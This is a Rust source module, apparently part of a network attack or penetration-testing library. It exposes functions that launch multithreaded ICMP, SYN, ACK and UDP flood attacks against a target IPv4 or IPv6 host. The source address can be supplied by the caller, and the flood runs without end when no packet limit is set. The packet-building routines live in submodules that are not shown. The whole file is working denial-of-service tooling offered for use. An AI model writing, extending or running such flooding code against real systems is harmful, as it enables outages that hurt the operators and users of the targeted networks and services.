use anyhow::Result;
use std::net::{Ipv4Addr, Ipv6Addr};

pub mod icmp;
pub mod icmp6;
pub mod tcp;
pub mod tcp6;
pub mod udp;
pub mod udp6;

use crate::utils;

enum FloodMethods {
    Icmp,
    Syn,
    Ack,
    Udp,
}

fn _run_flood(
    method: FloodMethods,
    src_ipv4: Option<Ipv4Addr>,
    src_port: Option<u16>,
    dst_ipv4: Ipv4Addr,
    dst_port: Option<u16>,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    let src_ipv4 = if src_ipv4.is_none() {
        let (_, src_ipv4, _) = utils::parse_interface(interface)?;
        src_ipv4
    } else {
        src_ipv4.unwrap()
    };

    let src_port = if src_port.is_none() {
        utils::random_port()
    } else {
        src_port.unwrap()
    };

    let dst_port = if dst_port.is_none() {
        utils::random_port()
    } else {
        dst_port.unwrap()
    };

    let func = match method {
        FloodMethods::Icmp => icmp::send_icmp_flood_packet,
        FloodMethods::Syn => tcp::send_syn_flood_packet,
        FloodMethods::Ack => tcp::send_ack_flood_packet,
        FloodMethods::Udp => udp::send_udp_flood_packet,
    };

    let pool = utils::get_threads_pool(threads_num);

    if max_flood_packet > 0 {
        for loop_num in 0..max_flood_packet {
            if print_result {
                if loop_num % 10000 == 0 {
                    println!("send {loop_num} packet");
                }
            }
            pool.execute(move || {
                let _ = func(src_ipv4, src_port, dst_ipv4, dst_port, max_same_packet);
            });
        }
    } else {
        let mut loop_num = 0;
        loop {
            loop_num += 1;
            if print_result {
                if loop_num % 10000 == 0 {
                    println!("send {loop_num} packet");
                }
            }
            pool.execute(move || {
                let _ = func(src_ipv4, src_port, dst_ipv4, dst_port, max_same_packet);
            });
        }
    }

    Ok(())
}

fn _run_flood6(
    method: FloodMethods,
    src_ipv6: Option<Ipv6Addr>,
    src_port: Option<u16>,
    dst_ipv6: Ipv6Addr,
    dst_port: Option<u16>,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    let src_ipv6 = if src_ipv6.is_none() {
        let (_, src_ipv6, _) = utils::parse_interface6(interface)?;
        src_ipv6
    } else {
        src_ipv6.unwrap()
    };

    let src_port = if src_port.is_none() {
        utils::random_port()
    } else {
        src_port.unwrap()
    };

    let dst_port = if dst_port.is_none() {
        utils::random_port()
    } else {
        dst_port.unwrap()
    };

    let func = match method {
        FloodMethods::Icmp => icmp6::send_icmp_flood_packet,
        FloodMethods::Syn => tcp6::send_syn_flood_packet,
        FloodMethods::Ack => tcp6::send_ack_flood_packet,
        FloodMethods::Udp => udp6::send_udp_flood_packet,
    };

    let pool = utils::get_threads_pool(threads_num);

    if max_flood_packet > 0 {
        for loop_num in 0..max_flood_packet {
            if print_result {
                if loop_num % 10000 == 0 {
                    println!("send {loop_num} packet");
                }
            }
            pool.execute(move || {
                let _ = func(src_ipv6, src_port, dst_ipv6, dst_port, max_same_packet);
            });
        }
    } else {
        let mut loop_num = 0;
        loop {
            loop_num += 1;
            if print_result {
                if loop_num % 10000 == 0 {
                    println!("send {loop_num} packet");
                }
            }
            pool.execute(move || {
                let _ = func(src_ipv6, src_port, dst_ipv6, dst_port, max_same_packet);
            });
        }
    }

    Ok(())
}

pub fn icmp_flood_host(
    src_ipv4: Option<Ipv4Addr>,
    dst_ipv4: Ipv4Addr,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    _run_flood(
        FloodMethods::Icmp,
        src_ipv4,
        Some(0),
        dst_ipv4,
        Some(0),
        interface,
        threads_num,
        print_result,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn icmp_flood_host6(
    src_ipv6: Option<Ipv6Addr>,
    dst_ipv6: Ipv6Addr,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    _run_flood6(
        FloodMethods::Icmp,
        src_ipv6,
        Some(0),
        dst_ipv6,
        Some(0),
        interface,
        threads_num,
        print_result,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn tcp_syn_flood_host(
    src_ipv4: Option<Ipv4Addr>,
    src_port: Option<u16>,
    dst_ipv4: Ipv4Addr,
    dst_port: Option<u16>,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    _run_flood(
        FloodMethods::Syn,
        src_ipv4,
        src_port,
        dst_ipv4,
        dst_port,
        interface,
        threads_num,
        print_result,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn tcp_syn_flood_host6(
    src_ipv6: Option<Ipv6Addr>,
    src_port: Option<u16>,
    dst_ipv6: Ipv6Addr,
    dst_port: Option<u16>,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    _run_flood6(
        FloodMethods::Syn,
        src_ipv6,
        src_port,
        dst_ipv6,
        dst_port,
        interface,
        threads_num,
        print_result,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn tcp_ack_flood_host(
    src_ipv4: Option<Ipv4Addr>,
    src_port: Option<u16>,
    dst_ipv4: Ipv4Addr,
    dst_port: Option<u16>,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    _run_flood(
        FloodMethods::Ack,
        src_ipv4,
        src_port,
        dst_ipv4,
        dst_port,
        interface,
        threads_num,
        print_result,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn tcp_ack_flood_host6(
    src_ipv6: Option<Ipv6Addr>,
    src_port: Option<u16>,
    dst_ipv6: Ipv6Addr,
    dst_port: Option<u16>,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    _run_flood6(
        FloodMethods::Ack,
        src_ipv6,
        src_port,
        dst_ipv6,
        dst_port,
        interface,
        threads_num,
        print_result,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn udp_flood_host(
    src_ipv4: Option<Ipv4Addr>,
    src_port: Option<u16>,
    dst_ipv4: Ipv4Addr,
    dst_port: Option<u16>,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    _run_flood(
        FloodMethods::Udp,
        src_ipv4,
        src_port,
        dst_ipv4,
        dst_port,
        interface,
        threads_num,
        print_result,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn udp_flood_host6(
    src_ipv6: Option<Ipv6Addr>,
    src_port: Option<u16>,
    dst_ipv6: Ipv6Addr,
    dst_port: Option<u16>,
    interface: Option<&str>,
    threads_num: usize,
    print_result: bool,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    _run_flood6(
        FloodMethods::Udp,
        src_ipv6,
        src_port,
        dst_ipv6,
        dst_port,
        interface,
        threads_num,
        print_result,
        max_same_packet,
        max_flood_packet,
    )
}
